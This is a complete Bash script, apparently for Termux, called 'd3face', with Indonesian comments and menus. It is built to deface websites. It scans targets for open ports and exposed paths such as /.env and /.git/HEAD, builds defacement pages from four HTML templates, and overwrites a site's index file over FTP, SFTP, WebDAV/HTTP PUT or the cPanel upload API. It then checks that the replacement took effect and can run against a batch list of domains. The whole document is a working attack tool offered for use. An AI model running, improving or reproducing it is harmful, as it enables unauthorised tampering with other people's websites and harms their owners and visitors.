#!/usr/bin/env bash
# d3face - tool deface website untuk Termux (bash + curl)
V="1.1.0"
CONF="$HOME/.config/d3face/config"
BKD="$HOME/.config/d3face/backups"
PGD="$HOME/.config/d3face/pages"
ERRF="$HOME/.config/d3face/.err"
IDX="index.html index.htm index.php default.html home.html"

if [ -t 1 ]; then R=$'\e[0m'; G=$'\e[92m'; Y=$'\e[93m'; B=$'\e[96m'; E=$'\e[91m'; D=$'\e[90m'
else R= G= Y= B= E= D=; fi

ok()   { printf '%s\n' "${G}[ OK ]${R} $*"; }
bad()  { printf '%s\n' "${E}[FAIL]${R} $*"; }
warn() { printf '%s\n' "${Y}[ !! ]${R} $*"; }
info() { printf '%s\n' "${B}[ .. ]${R} $*"; }
hr()   { printf '%s\n' "${D}----------------------------------------------${R}"; }
pause() { printf '%s' "${D}  [Enter] lanjut...${R}"; read -r _; }

ask() {
  local p=$1 d=${2-} v
  printf '%s' "${B}>${R} $p" >&2
  [ -n "$d" ] && printf ' %s' "${D}[$d]${R}" >&2
  printf ': ' >&2
  read -r v
  printf '%s' "${v:-$d}"
}
askyn() { local v; v=$(ask "$1 (y/n)" "${2:-y}"); [ "${v:0:1}" = "y" ]; }

esc() { local s=$1; s=${s//&/&amp;}; s=${s//</&lt;}; printf '%s' "$s"; }

req() {
  local out rc
  out=$(curl -sS -k --connect-timeout 12 -m 180 --retry 2 --retry-delay 2 \
        --retry-connrefused "$@" 2>"$ERRF")
  rc=$?
  ERRMSG=$(cat "$ERRF" 2>/dev/null)
  printf '%s' "$out"
  return $rc
}

usage() {
  cat <<EOF
d3face $V - deface website dari Termux

  d3face                     menu interaktif
  d3face -d DOMAIN [opsi]    langsung jalan

opsi:
  -d, --domain DOMAIN   target
  -m, --method M        auto|ftp|sftp|webdav|put|cpanel
  -u, --user USER       username
  -p, --pass PASS       password
  -P, --path DIR        folder tujuan (default /)
  -s, --scheme S        http|https
      --port N          port manual
  -t, --tpl N           template 1-4
  -a, --alias NAME      alias
  -l, --list FILE       batch: daftar domain per baris
  -y, --yes             tanpa konfirmasi
  -h, --help            bantuan
EOF
}

init() {
  mkdir -p "$(dirname "$CONF")" "$BKD" "$PGD" 2>/dev/null
  if [ ! -f "$CONF" ]; then
    cat >"$CONF" <<'EOF'
ALIAS="d3face"
MSG="Situs ini telah di-deface. Tidak ada data yang rusak."
PATH_DIR="/"
METHOD="auto"
TPL="1"
EOF
  fi
  # shellcheck disable=SC1090
  . "$CONF"
  command -v curl >/dev/null 2>&1 || { bad "curl belum ada: pkg install curl"; exit 1; }
}

save() {
  cat >"$CONF" <<EOF
ALIAS="$ALIAS"
MSG="$MSG"
PATH_DIR="$PATH_DIR"
METHOD="$METHOD"
TPL="$TPL"
EOF
}

# ---------- template ----------
gen_page() {
  local t=$1 a m h k body
  a=$(esc "$2"); m=$(esc "$3"); h=$4; k=$5
  case $t in
    1) body=$(cat <<'EOF'
<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>__ALIAS__</title>
<style>html,body{margin:0;height:100%;background:#000;color:#00ff41;font-family:"Courier New",monospace}
body{display:flex;align-items:center;justify-content:center;background-image:linear-gradient(rgba(0,255,65,.06) 1px,transparent 1px);background-size:100% 4px}
.b{text-align:center;padding:2rem;max-width:760px}h1{font-size:clamp(2.2rem,10vw,4.6rem);margin:0;letter-spacing:.1em;text-shadow:0 0 10px #00ff41,0 0 40px #007a1f}
p{margin:1.4rem auto 0;max-width:600px;line-height:1.6;color:#8dffb0}
pre{display:inline-block;text-align:left;margin-top:2rem;font-size:.72rem;color:#3fbf62;border:1px solid #0d5c26;padding:.8rem;background:#001a08}</style></head><body><div class="b">
<h1>__ALIAS__</h1><p>__MSG__</p><pre>host : __HOST__
time : __TS__
tool : d3face</pre></div><!-- __MARKER__ --></body></html>
EOF
);;
    2) body=$(cat <<'EOF'
<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>__ALIAS__</title>
<style>html,body{margin:0;height:100%;background:#0a0a0c;color:#f2f2f5;font-family:-apple-system,Segoe UI,Roboto,sans-serif}
body{display:flex;align-items:center;justify-content:center}.b{text-align:center;padding:2rem;max-width:700px}
h1{font-size:clamp(2.4rem,9vw,5rem);margin:0;font-weight:800;letter-spacing:-.02em}
p{margin:1.2rem auto 0;max-width:560px;line-height:1.65;color:#9a9aa8}
.m{margin-top:2.5rem;display:flex;gap:.6rem;justify-content:center;flex-wrap:wrap;font-size:.7rem;letter-spacing:.15em;color:#5a5a68}
.m span{border:1px solid #23232e;padding:.4rem .7rem;border-radius:4px}</style></head><body><div class="b">
<h1>__ALIAS__</h1><p>__MSG__</p><div class="m"><span>__HOST__</span><span>__TS__</span></div></div><!-- __MARKER__ --></body></html>
EOF
);;
    3) body=$(cat <<'EOF'
<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>__ALIAS__</title>
<style>html,body{margin:0;height:100%;background:#08000f;color:#fff;font-family:"Courier New",monospace;overflow:hidden}
body{display:flex;align-items:center;justify-content:center}
h1{position:relative;font-size:clamp(2.4rem,10vw,5rem);letter-spacing:.06em;margin:0;animation:j 2.4s infinite}
h1:before,h1:after{content:attr(data-t);position:absolute;left:0;top:0;width:100%}
h1:before{color:#ff0055;animation:x .8s infinite}h1:after{color:#00eaff;animation:x .8s infinite reverse}
@keyframes x{0%{transform:translate(2px,-2px)}50%{transform:translate(-3px,2px)}100%{transform:translate(2px,2px)}}
@keyframes j{0%,100%{transform:none}50%{transform:translateX(2px)}}
.b{text-align:center;padding:2rem;max-width:720px}p{margin:1.6rem auto 0;color:#c3a8ff;line-height:1.6;max-width:560px}
pre{margin-top:2rem;font-size:.7rem;color:#7a5cff}</style></head><body><div class="b">
<h1 data-t="__ALIAS__">__ALIAS__</h1><p>__MSG__</p><pre>__HOST__ // __TS__</pre></div><!-- __MARKER__ --></body></html>
EOF
);;
    4) body=$(cat <<'EOF'
<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>__ALIAS__</title>
<style>html,body{margin:0;height:100%;background:#120404;color:#ffe9e9;font-family:"Courier New",monospace}
body{display:flex;align-items:center;justify-content:center;background-image:repeating-linear-gradient(45deg,#170606 0 12px,#120404 12px 24px)}
.b{text-align:center;padding:2.5rem;max-width:700px;border:1px solid #4a1010;background:#0d0303}
h1{font-size:clamp(2rem,8vw,3.8rem);margin:0;color:#ff3b3b;letter-spacing:.14em;text-transform:uppercase}
p{margin:1.4rem auto 0;max-width:560px;line-height:1.65;color:#e0a5a5}
.m{margin-top:2.2rem;font-size:.72rem;color:#8a4a4a;letter-spacing:.12em}</style></head><body><div class="b">
<h1>__ALIAS__</h1><p>__MSG__</p><div class="m">__HOST__ :: __TS__</div></div><!-- __MARKER__ --></body></html>
EOF
);;
    *) gen_page 1 "$2" "$3" "$4" "$5"; return;;
  esac
  body=${body//__ALIAS__/$a}
  body=${body//__MSG__/$m}
  body=${body//__HOST__/$h}
  body=${body//__TS__/$(date '+%Y-%m-%d %H:%M:%S')}
  body=${body//__MARKER__/$k}
  printf '%s\n' "$body"
}

# ---------- jaringan ----------
dns() { getent hosts "$1" 2>/dev/null | awk 'NR==1{print $1}'; }
port_open() { timeout 5 bash -c "echo >/dev/tcp/$1/$2" 2>/dev/null; }

cek_login() {
  local m=$1 h=$2 p=$3 u=$4 w=$5 path=$6 sch=$7 o
  case $m in
    ftp|sftp)
      if req -u "$u:$w" "ftp://$h/" >/dev/null; then ok "$m: login berhasil"; return 0; fi
      bad "$m: login ditolak"; return 1;;
    webdav|put)
      o=$(req -X OPTIONS -D - "$sch://$h$path")
      case ${o^^} in *PUT*) ok "$m: PUT aktif"; return 0;; esac
      bad "$m: PUT tidak diizinkan"; return 1;;
    cpanel)
      if req -u "$u:$w" "https://$h:$p/execute/Fileman/list_files?dir=/public_html" | grep -q '"status":1'
      then ok "cpanel: login berhasil"; return 0; fi
      bad "cpanel: login ditolak"; return 1;;
  esac
}

detect_index() {
  local n code
  for n in $IDX; do
    code=$(req -I -o /dev/null -w '%{http_code}' "$1/$n")
    case $code in 200|301|302) printf '%s' "$n"; return 0;; esac
  done
  printf 'index.html'
}

upload() {
  local m=$1 h=$2 p=$3 sch=$4 path=$5 u=$6 w=$7 f=$8 base d
  base="$sch://$h"; [ "$p" != 80 ] && [ "$p" != 443 ] && base="$sch://$h:$p"
  case $m in
    ftp)  req --ftp-create-dirs -T "$f" -u "$u:$w" "ftp://$h$path" >/dev/null;;
    sftp) req --ftp-create-dirs -T "$f" -u "$u:$w" "sftp://$h$path" >/dev/null;;
    webdav|put)
      if [ -n "$u" ]; then req -u "$u:$w" -T "$f" "$base$path" >/dev/null
      else req -T "$f" "$base$path" >/dev/null; fi;;
    cpanel)
      d=$(dirname "$path")
      req -u "$u:$w" -F "dir=$d" -F "file=@$f;filename=$(basename "$path")" \
          "https://$h:$p/execute/Fileman/upload_files" | grep -q '"status":1';;
    *) return 1;;
  esac
}

verify() {
  local out
  out=$(req "$1$2?v=$RANDOM$RANDOM")
  case $out in *"$3"*) return 0;; esac
  case ${out,,} in *"${4,,}"*) return 0;; esac
  return 1
}

# ---------- aksi ----------
do_deface() { # host
  local host=$1 sch meth u w port dir tpl alias msg marker base path local b m done=0
  sch=${SCHEME:-https}
  meth=${D_METHOD:-auto}
  u=${D_USER:-}; w=${D_PASS:-}
  port=${D_PORT:-0}
  dir=$PATH_DIR
  tpl=$TPL
  alias=$ALIAS
  msg=$MSG

  if [ -z "$YES" ]; then
    [ -z "$host" ] && host=$(ask "domain target")
    [ -z "$host" ] && { bad "domain kosong"; return 1; }
  fi
  host=${host#http://}; host=${host#https://}; host=${host%%/*}; host=${host%/}

  if [ -z "$YES" ]; then
    sch=$(ask "skema (http/https)" "$sch")
    meth=$(ask "metode (auto/ftp/sftp/webdav/put/cpanel)" "$meth")
  fi
  [ "${sch:0:1}" = "h" ] || sch="http"
  case $meth in auto|ftp|sftp|webdav|put|cpanel) ;; *) bad "metode tidak dikenal"; return 1;; esac

  case $meth in
    ftp|sftp|webdav|cpanel)
      if [ -z "$u" ] && [ -z "$YES" ]; then u=$(ask "username"); w=$(ask "password"); fi
      if [ -z "$u" ] || [ -z "$w" ]; then bad "username/password wajib untuk $meth"; return 1; fi;;
  esac
  [ "$port" = 0 ] && case $meth in ftp) port=21;; sftp) port=22;; cpanel) port=2083;; *) port=0;; esac
  [ "$port" = 0 ] && { [ "$sch" = "https" ] && port=443 || port=80; }

  if [ -z "$YES" ]; then
    dir=$(ask "folder tujuan" "$dir")
    printf '\n  1. matrix  2. minimal  3. glitch  4. merah\n'
    tpl=$(ask "template" "$tpl")
    alias=$(ask "alias" "$alias")
    msg=$(ask "pesan" "$msg")
  fi
  case $tpl in 1|2|3|4) ;; *) tpl=1;; esac

  clear 2>/dev/null
  info "memeriksa $host:$port ..."
  if ! port_open "$host" "$port"; then bad "port $port tertutup / tidak merespons"; return 1; fi
  ok "port $port terbuka"

  if [ -n "$u" ]; then
    cek_login "$meth" "$host" "$port" "$u" "$w" "$dir" "$sch" || {
      [ -z "$YES" ] && ! askyn "metode kemungkinan gagal, lanjut?" && return 1; }
  fi

  base="$sch://$host"; [ "$port" != 80 ] && [ "$port" != 443 ] && base="$sch://$host:$port"
  path="${dir%/}/$(detect_index "$base")"
  ok "target: $path"

  marker="d3face-$RANDOM$RANDOM$RANDOM"
  local="$PGD/${host}_$(basename "$path")"
  gen_page "$tpl" "$alias" "$msg" "$host" "$marker" >"$local" || { bad "gagal menulis file"; return 1; }

  echo; hr
  printf '  host   : %s\n  file   : %s\n  metode : %s\n' "$host" "$path" "$meth"; hr
  [ -z "$YES" ] && ! askyn "mulai deface?" && return 1

  b="$BKD/${host}_$(date +%s)_$(basename "$path")"
  if req -o "$b" "$base$path" && [ -s "$b" ]; then ok "backup: $b"; else rm -f "$b"; b=""; warn "backup dilewati"; fi

  case $meth in auto) set -- ftp sftp webdav put;; *) set -- "$meth";; esac
  for m in "$@"; do
    case $m in ftp|sftp|webdav|cpanel) [ -z "$u" ] && continue;; esac
    info "coba $m ..."
    if upload "$m" "$host" "$port" "$sch" "$path" "$u" "$w" "$local"; then
      ok "$m berhasil upload"
      if verify "$base" "$path" "$marker" "$alias"; then
        ok "verifikasi lolos"
        printf '\n%s\n' "${G}  BERHASIL: $base$path${R}"
        return 0
      fi
      bad "verifikasi gagal, halaman belum berubah"
    else
      bad "$m gagal: ${ERRMSG:-rc=$?}"
    fi
  done

  printf '\n%s\n' "${E}  GAGAL semua metode${R}"
  [ -n "$b" ] && warn "backup tersimpan, restore lewat menu 3"
  return 1
}

batch() {
  local f=$1 h n=0 s=0
  [ -f "$f" ] || { bad "file tidak ada: $f"; return; }
  while IFS= read -r h; do
    h=${h%%#*}; h=$(printf '%s' "$h" | tr -d ' \t\r')
    [ -z "$h" ] && continue
    n=$((n+1))
    printf '\n%s\n' "${B}=== [$n] $h ===${R}"
    do_deface "$h" && s=$((s+1))
  done <"$f"
  printf '\n%s\n' "${G}selesai: $s/$n berhasil${R}"
}

recon() {
  clear; printf '%s\n' "${B}  === RECON ===${R}"; echo
  local h p path code
  h=$(ask "domain"); [ -z "$h" ] && return
  h=${h#http://}; h=${h#https://}; h=${h%%/*}
  [ -z "$(dns "$h")" ] && { bad "tidak bisa di-resolve"; return; }
  ok "IP: $(dns "$h")"
  for p in 21 22 80 443 2083 2222; do
    if port_open "$h" "$p"; then warn "port $p terbuka"
    else printf '%s\n' "${D}port $p tertutup${R}"; fi
  done
  for path in /wp-login.php /administrator/ /phpmyadmin/ /.git/HEAD /.env; do
    code=$(req -o /dev/null -w '%{http_code}' "https://$h$path")
    case $code in 200|401|403|301|302) warn "$code  $path";; esac
  done
}

restore() {
  clear; printf '%s\n' "${Y}  === RESTORE ===${R}"; echo
  local list n f host u w m port path
  list=$(ls -1t "$BKD" 2>/dev/null | head -20)
  [ -z "$list" ] && { warn "belum ada backup"; return; }
  printf '%s\n' "$list" | nl -w2 -s'. '
  n=$(ask "nomor")
  f=$(printf '%s\n' "$list" | sed -n "${n}p"); [ -z "$f" ] && { bad "tidak ada"; return; }
  host=${f%%_*}; host=$(ask "domain konfirmasi" "$host")
  u=$(ask "username"); w=$(ask "password")
  m=$(ask "metode (ftp/sftp/webdav)" "ftp")
  case $m in ftp) port=21;; sftp) port=22;; *) port=80;; esac
  path="${PATH_DIR%/}/${f##*_}"
  if upload "$m" "$host" "$port" "http" "$path" "$u" "$w" "$BKD/$f"; then ok "restore terkirim"
  else bad "gagal: ${ERRMSG:-unknown}"; fi
}

setting() {
  clear; printf '%s\n' "${Y}  === PENGATURAN ===${R}"; echo
  ALIAS=$(ask "alias default" "$ALIAS")
  MSG=$(ask "pesan default" "$MSG")
  PATH_DIR=$(ask "folder default" "$PATH_DIR")
  METHOD=$(ask "metode default" "$METHOD")
  save; ok "disimpan"
}

menu() {
  clear
  printf '%s\n' "${G}  ###########################${R}"
  printf '%s\n' "${G}  #       d 3 f a c e  $V   #${R}"
  printf '%s\n' "${G}  ###########################${R}"
  printf '\n  alias: %s   metode: %s\n\n' "${B}$ALIAS${R}" "${B}$METHOD${R}"
  printf '  1. Cek target (recon)\n  2. Deface website\n  3. Restore backup\n  4. Pengaturan\n  0. Keluar\n\n'
}

main() {
  HOST=""; D_USER=""; D_PASS=""; D_METHOD=""; SCHEME=""; D_PORT=0; YES=""; BATCHF=""
  while [ $# -gt 0 ]; do
    case $1 in
      -d|--domain) HOST=$2; shift 2;;
      -m|--method) D_METHOD=$2; shift 2;;
      -u|--user) D_USER=$2; shift 2;;
      -p|--pass) D_PASS=$2; shift 2;;
      -P|--path) PATH_DIR=$2; shift 2;;
      -s|--scheme) SCHEME=$2; shift 2;;
      --port) D_PORT=$2; shift 2;;
      -t|--tpl) TPL=$2; shift 2;;
      -a|--alias) ALIAS=$2; shift 2;;
      -l|--list) BATCHF=$2; shift 2;;
      -y|--yes) YES=1; shift;;
      -V|--version) echo "d3face $V"; exit 0;;
      -h|--help) usage; exit 0;;
      *) shift;;
    esac
  done

  init
  [ -n "$BATCHF" ] && { batch "$BATCHF"; exit $?; }
  [ -n "$HOST" ] && { do_deface "$HOST"; exit $?; }

  while :; do
    menu
    case $(ask "pilih" "0") in
      1) recon; pause;;
      2) do_deface ""; pause;;
      3) restore; pause;;
      4) setting; pause;;
      0) clear; exit 0;;
      *) warn "pilihan salah"; sleep 1;;
    esac
  done
}

trap 'echo; warn "dibatalkan"' INT
main "$@"